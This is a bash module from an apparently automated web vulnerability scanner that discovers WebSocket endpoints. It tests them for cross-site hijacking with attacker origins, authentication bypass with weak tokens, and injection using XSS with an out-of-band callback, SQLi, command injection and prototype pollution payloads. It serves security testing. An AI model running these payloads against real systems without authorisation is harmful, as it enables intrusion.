#======================= PHASE 17: WEBSOCKET VULNERABILITY TESTING =======================
# WebSocket endpoint discovery, injection testing, auth bypass, cross-site hijacking

_ws_discover_endpoints() {
    local WS_DIR="$1"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"

    log "[WS] Discovering WebSocket endpoints..."

    local -a WS_PATHS=(
        "/ws" "/websocket" "/socket" "/socket.io" "/sockjs" "/ws/chat"
        "/api/ws" "/realtime" "/live" "/stream" "/updates" "/events"
        "/ws/v1" "/ws/v2" "/api/socket" "/cable" "/action_cable"
        "/hub" "/signalr" "/ws/notifications" "/push"
    )

    : > "$WS_DIR/endpoints.txt"

    head -30 "$ALIVE_FILE" 2>/dev/null | while IFS= read -r BASEURL; do
        BASEURL="${BASEURL%/}"
        local HOST
        HOST=$(echo "$BASEURL" | awk -F/ '{print $3}')
        local SCHEME="ws"
        [[ "$BASEURL" == https://* ]] && SCHEME="wss"

        for WS_PATH in "${WS_PATHS[@]}"; do
            local WS_TARGET="${SCHEME}://${HOST}${WS_PATH}"
            local HTTP_TARGET="${BASEURL}${WS_PATH}"

            # Check HTTP upgrade response
            local RESP_CODE
            RESP_CODE=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
                -H "Upgrade: websocket" \
                -H "Connection: Upgrade" \
                -H "Sec-WebSocket-Version: 13" \
                -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                "$HTTP_TARGET" --max-time 8 2>/dev/null || echo "000")

            if [[ "$RESP_CODE" == "101" ]]; then
                echo "$WS_TARGET" >> "$WS_DIR/endpoints.txt"
                success "WebSocket endpoint: $WS_TARGET (101 Upgrade)"
            elif [[ "$RESP_CODE" =~ ^[23] ]]; then
                echo "$WS_TARGET [HTTP $RESP_CODE]" >> "$WS_DIR/possible_endpoints.txt"
            fi
        done

        # Also check JS files for ws:// or wss:// URLs
        local JS_DIR="$OUTDIR/urls"
        if [ -s "$JS_DIR/js_files.txt" ]; then
            while IFS= read -r JSURL; do
                curl_safe -sk "$JSURL" 2>/dev/null \
                    | grep -oE 'wss?://[^"'"'"' ]+' \
                    >> "$WS_DIR/endpoints.txt" 2>/dev/null || true
            done < <(head -20 "$JS_DIR/js_files.txt" 2>/dev/null)
        fi
    done

    sort -u "$WS_DIR/endpoints.txt" -o "$WS_DIR/endpoints.txt" 2>/dev/null || true
    local WS_COUNT
    WS_COUNT=$(wc -l < "$WS_DIR/endpoints.txt" 2>/dev/null || echo 0)
    info "[WS] Found $WS_COUNT WebSocket endpoints"
}

_ws_test_with_websocat() {
    local WS_URL="$1"
    local WS_DIR="$2"
    local SAFE_NAME
    SAFE_NAME=$(echo "$WS_URL" | md5sum | cut -d' ' -f1)
    local OUT="$WS_DIR/ws_responses_${SAFE_NAME}.txt"

    # websocat is the primary tool; wscat is the legacy fallback
    local WS_TOOL=""
    command -v websocat &>/dev/null && WS_TOOL="websocat"
    [ -z "$WS_TOOL" ] && command -v wscat &>/dev/null && WS_TOOL="wscat"
    [ -z "$WS_TOOL" ] && { info "[WS] No WebSocket client found (install websocat)"; return; }

    log "[WS] Testing $WS_URL with $WS_TOOL..."

    local -a WS_PAYLOADS=(
        '{"type":"test","msg":"hello"}'
        '{"msg":"<script>fetch(\"//xss.'${OOB_DOMAIN:-oast.pro}'/ws\")</script>"}'
        '{"action":"subscribe","channel":"admin"}'
        '{"action":"admin","user_id":1}'
        '{"type":"auth","token":"null"}'
        '{"query":"{__typename}"}'
    )

    for PAYLOAD in "${WS_PAYLOADS[@]}"; do
        if [ "$WS_TOOL" = "websocat" ]; then
            # websocat: one-shot send-and-receive, more powerful than wscat
            printf '%s\n' "$PAYLOAD" | \
                timeout 8 websocat \
                    --one-message \
                    --no-close \
                    -n \
                    "$WS_URL" \
                    2>/dev/null >> "$OUT" || true
        else
            # wscat legacy fallback
            timeout 5 wscat -c "$WS_URL" \
                --no-color \
                -x "$PAYLOAD" \
                2>/dev/null >> "$OUT" || true
        fi
    done
}

_ws_csrf_hijack() {
    local WS_DIR="$1"
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"

    log "[WS] Testing Cross-Site WebSocket Hijacking (CSWSH)..."

    # CSWSH: check if WS endpoint accepts connections without Origin validation
    local -a EVIL_ORIGINS=(
        "https://evil.com"
        "https://attacker.com"
        "null"
        "https://${DOMAIN}.evil.com"
    )

    while IFS= read -r WS_URL; do
        local HTTP_URL
        HTTP_URL=$(echo "$WS_URL" | sed 's|^wss://|https://|;s|^ws://|http://|')
        for ORIGIN in "${EVIL_ORIGINS[@]}"; do
            local RESP_CODE
            RESP_CODE=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
                -H "Origin: $ORIGIN" \
                -H "Upgrade: websocket" \
                -H "Connection: Upgrade" \
                -H "Sec-WebSocket-Version: 13" \
                -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                "$HTTP_URL" --max-time 8 2>/dev/null || echo "000")
            if [[ "$RESP_CODE" == "101" ]]; then
                echo "CSWSH: $WS_URL accepts Origin: $ORIGIN" >> "$WS_DIR/cswsh_hits.txt"
                vuln "CROSS-SITE WEBSOCKET HIJACKING: $WS_URL accepts evil origin $ORIGIN"
                notify_vuln "high" "CSWSH: $WS_URL allows connection from $ORIGIN (no origin validation)"
            fi
        done
    done < "$WS_DIR/endpoints.txt"
}

_ws_auth_bypass() {
    local WS_DIR="$1"

    log "[WS] Testing WebSocket authentication bypass..."

    while IFS= read -r WS_URL; do
        local HTTP_URL
        HTTP_URL=$(echo "$WS_URL" | sed 's|^wss://|https://|;s|^ws://|http://|')

        # No auth header
        local R1
        R1=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
            -H "Upgrade: websocket" -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Version: 13" \
            -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
            "$HTTP_URL" --max-time 5 2>/dev/null || echo "000")

        # Auth bypass tokens
        for TOKEN in "" "null" "undefined" "guest" "admin" "Bearer null"; do
            local R2
            R2=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
                -H "Authorization: Bearer $TOKEN" \
                -H "Upgrade: websocket" -H "Connection: Upgrade" \
                -H "Sec-WebSocket-Version: 13" \
                -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                "$HTTP_URL" --max-time 5 2>/dev/null || echo "000")
            if [[ "$R2" == "101" ]]; then
                echo "WS AUTH BYPASS: $WS_URL | token: '$TOKEN'" >> "$WS_DIR/auth_bypass.txt"
                vuln "WEBSOCKET AUTH BYPASS: $WS_URL accepts token: '$TOKEN'"
                notify_vuln "critical" "WebSocket Auth Bypass: $WS_URL — no auth required (token=$TOKEN)"
            fi
        done
    done < "$WS_DIR/endpoints.txt"
}

_ws_injection_test() {
    local WS_DIR="$1"

    log "[WS] WebSocket message injection testing..."

    # Use websocat (preferred) or wscat (fallback)
    if ! command -v websocat &>/dev/null && ! command -v wscat &>/dev/null; then
        info "[WS] No WebSocket client found — using curl upgrade method for injection (install websocat)"
    fi

    local -a INJECTION_PAYLOADS=(
        # XSS
        '<script>fetch("//xss.'${OOB_DOMAIN:-oast.pro}'/ws-xss")</script>'
        # SQLi
        "' OR '1'='1' --"
        "\" OR 1=1--"
        # Command injection
        "; id ;"
        "\$(id)"
        # JSON injection
        '{"type":"admin","__proto__":{"admin":true}}'
        # Prototype pollution
        '{"constructor":{"prototype":{"isAdmin":true}}}'
    )

    while IFS= read -r WS_URL; do
        _ws_test_with_websocat "$WS_URL" "$WS_DIR"
        for PAYLOAD in "${INJECTION_PAYLOADS[@]}"; do
            local SAFE_PAYLOAD
            SAFE_PAYLOAD=$(printf '%s' "$PAYLOAD" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null || echo "\"$PAYLOAD\"")
            # Try GET-based WS with injection in query param
            local HTTP_URL
            HTTP_URL=$(echo "$WS_URL" | sed 's|^wss://|https://|;s|^ws://|http://|')
            curl_safe -sk "${HTTP_URL}?msg=${PAYLOAD}" -o /dev/null 2>/dev/null &
        done
    done < "$WS_DIR/endpoints.txt"
    wait
}

_ws_ssl_check() {
    local WS_DIR="$1"

    log "[WS] Checking for ws:// (unencrypted) WebSocket endpoints..."

    grep "^ws://" "$WS_DIR/endpoints.txt" 2>/dev/null | while IFS= read -r WS_URL; do
        echo "UNENCRYPTED WS: $WS_URL" >> "$WS_DIR/ssl_issues.txt"
        vuln "UNENCRYPTED WEBSOCKET: $WS_URL uses ws:// (no TLS)"
        notify_vuln "medium" "Unencrypted WebSocket: $WS_URL uses ws:// — data in transit not encrypted"
    done
}

phase_17_websocket() {
    if phase_done "phase_17"; then return 0; fi
    [ "$WEBSOCKET_MODE" -ne 1 ] && { info "WebSocket mode disabled — skipping phase 17"; return; }
    phase_banner "PHASE 17: WEBSOCKET VULNERABILITY TESTING"

    local START_TIME
    START_TIME=$(date +%s)
    local WS_DIR="$OUTDIR/advanced/websocket"
    mkdir -p "$WS_DIR"

    : > "$WS_DIR/endpoints.txt"
    : > "$WS_DIR/cswsh_hits.txt"
    : > "$WS_DIR/auth_bypass.txt"
    : > "$WS_DIR/ssl_issues.txt"

    _ws_discover_endpoints "$WS_DIR"

    local WS_COUNT
    WS_COUNT=$(wc -l < "$WS_DIR/endpoints.txt" 2>/dev/null || echo 0)
    if [ "$WS_COUNT" -eq 0 ]; then
        info "No WebSocket endpoints found — skipping WebSocket tests"
        mark_done "phase_17"
        return
    fi

    _ws_ssl_check "$WS_DIR"
    _ws_csrf_hijack "$WS_DIR"
    _ws_auth_bypass "$WS_DIR"
    _ws_injection_test "$WS_DIR"

    local CSWSH_CNT AUTH_CNT SSL_CNT
    CSWSH_CNT=$(wc -l < "$WS_DIR/cswsh_hits.txt" 2>/dev/null || echo 0)
    AUTH_CNT=$(wc -l < "$WS_DIR/auth_bypass.txt" 2>/dev/null || echo 0)
    SSL_CNT=$(wc -l < "$WS_DIR/ssl_issues.txt" 2>/dev/null || echo 0)

    success "PHASE 17 DONE — WS Endpoints: $WS_COUNT | CSWSH: $CSWSH_CNT | Auth bypass: $AUTH_CNT | Unencrypted: $SSL_CNT | Time: $(( $(date +%s) - START_TIME ))s"
    notify "Phase 17: WebSocket done — $WS_COUNT endpoints, CSWSH=$CSWSH_CNT, AuthBypass=$AUTH_CNT" "🔌"
    mark_done "phase_17"
    echo ""
}
